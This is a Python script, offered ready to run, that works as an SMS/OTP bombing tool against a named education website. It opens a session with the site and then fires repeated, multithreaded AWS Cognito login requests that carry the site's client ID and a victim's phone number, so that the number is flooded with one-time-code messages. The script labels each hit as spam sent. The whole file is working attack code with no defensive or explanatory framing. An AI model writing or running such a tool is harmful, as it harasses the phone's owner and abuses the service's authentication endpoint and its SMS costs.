import requests
import concurrent.futures

# URLs for the initial GET request and the target POST request
get_url = "https://www.prepladder.com"  # Replace with the actual URL if different
post_url = "https://cognito-idp.ap-south-1.amazonaws.com/"
session = requests.Session()
initial_response = session.get(get_url, headers={"User-Agent": "Mozilla/5.0"})
if initial_response.status_code == 200:
    print("Session started successfully, cookies and tokens retrieved.")
else:
    print("Failed to retrieve initial tokens.")
    exit()

headers = {
    "Sec-Ch-Ua": '"Not(A:Brand";v="24", "Chromium";v="122"',
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36",
    "Content-Type": "application/x-amz-json-1.1",
    "X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth",
    "X-Amz-User-Agent": "aws-amplify/5.0.4 js",
    "Accept": "*/*",
    "Origin": "https://www.prepladder.com",
    "Referer": "https://www.prepladder.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=4, i",
}


country_code = str(input("Enter target country_code: "))
phone_number = str(input("Enter target phone number : "))

full_number = country_code + phone_number

data = {
    "AuthFlow": "CUSTOM_AUTH",
    "ClientId": "69og9542ivfrk88hrijcs1i7t8",
    "AuthParameters": {
        "USERNAME": full_number
    },
    "ClientMetadata": {}
}

def send_request():

    response = session.post(post_url, headers=headers, json=data)
    if response.status_code == 200:
        print(f"SPAM SENT TO {full_number}: {response.status_code}")
    else:
        print(f"FAILED ({response.status_code}): {response.text}")


n = int(input("How many times do you want to spam the number?: "))
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(send_request) for _ in range(n)]
    for future in concurrent.futures.as_completed(futures):
        pass
